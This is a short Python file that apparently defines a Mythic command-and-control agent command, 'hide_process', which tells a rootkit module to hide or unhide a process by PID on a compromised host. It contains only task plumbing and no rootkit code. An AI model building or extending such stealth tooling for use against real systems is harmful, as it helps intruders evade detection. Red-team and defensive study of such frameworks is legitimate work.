from mythic_container.MythicCommandBase import *
import json
from mythic_container.MythicRPC import *


class HideProcessArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="pid",
                cli_name="PID",
                display_name="Process ID",
                type=ParameterType.Number,
                description="Process ID to hide/unhide",
            ),
        ]
    
    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("Require arguments.")
        if self.command_line[0] != "{":
            raise Exception("Require JSON blob, but got raw command line.")
        self.load_args_from_json_string(self.command_line)


class HideProcessCommand(CommandBase):
    cmd = "hide_process"
    needs_admin = True
    help_cmd = "hide_process (modal popup)"
    description = "Hide or unhide a process by PID using the rootkit"
    version = 1
    supported_ui_features = []
    author = "Anonymous"
    argument_class = HideProcessArguments
    attackmapping = ["T1055", "T1106"]  # Process Injection, Native API
    attributes = CommandAttributes(
        suggested_command=True,
        dependencies=["rootkit_module"]
    )

    async def create_go_tasking(
            self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
            CommandName="hide_process"
        )
        
        pid = taskData.args.get_arg("pid")
        response.DisplayParams = f"Hiding/unhiding process PID: {pid}"
        return response
    
    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp